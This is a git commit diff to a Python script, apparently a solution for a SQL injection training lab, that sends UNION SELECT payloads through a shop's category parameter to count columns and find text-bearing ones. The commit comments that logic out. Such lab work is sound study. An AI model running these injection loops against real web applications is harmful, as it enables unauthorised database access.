35d7fb3c28ef7a770a1be1428074c913b39122ba
madi <madimirzakup@gmail.com>
2025-01-12 18:25:29 +0500

    #

--- Server Side Topics/SQLi/SQL injection UNION attack, finding a column containing text/payload.py
+++ Server Side Topics/SQLi/SQL injection UNION attack, finding a column containing text/payload.py
@@ -22,30 +22,30 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def main(args):
     shop = Shop(args.url, args.no_proxy)
-    nulls_list = ["NULL"]
-    num_columns = None
-    log.info("Determining number of culmn")
-    while len(nulls_list) < 50:
-        nulls = ",".join(nulls_list)
-        category = f"' UNION SELECT {nulls}-- "
-        resp = shop.get_category(category)
-        if resp.status_code == 200:
-            num_columns = len(nulls_list)
-            break
-        nulls_list.append("NULL")
-    if num_columns:        
-        log.info(f"Number of columns is : {num_columns}")
-    text_columns = []
-    for i in range (0, num_columns):
-        nulls_list = ["NULL"] * num_columns    
-        nulls_list[i] = "a"
-        nulls = ",".join(nulls_list)
-        category = f"' UNION SELECT {nulls}-- "
-        resp = shop.get_category(category)
-        if resp.status_code == 200:
-            text_columns.append(i)
-    ", ".join(map(str, text_columns))            
-    log.info("The text columns are: ")
+    #nulls_list = ["NULL"]
+    #num_columns = None
+    #log.info("Determining number of culmn")
+    #while len(nulls_list) < 50:
+    #    nulls = ",".join(nulls_list)
+    #    category = f"' UNION SELECT {nulls}-- "
+    #    resp = shop.get_category(category)
+    #    if resp.status_code == 200:
+    #        num_columns = len(nulls_list)
+    #        break
+    #    nulls_list.append("NULL")
+    #if num_columns:        
+    #    log.info(f"Number of columns is : {num_columns}")
+    #text_columns = []
+    #for i in range (0, num_columns):
+    #    nulls_list = ["NULL"] * num_columns    
+    #    nulls_list[i] = "'a'"
+    #    nulls = ",".join(nulls_list)
+    #    category = f"' UNION SELECT {nulls}-- "
+    #    resp = shop.get_category(category)
+    #    if resp.status_code == 200:
+    #        text_columns.append(i)
+    #text_columns_str = ", ".join(map(str, text_columns))            
+    #log.info(f"The text columns are: {text_columns_str}")
         
     
 if __name__ == "__main__":
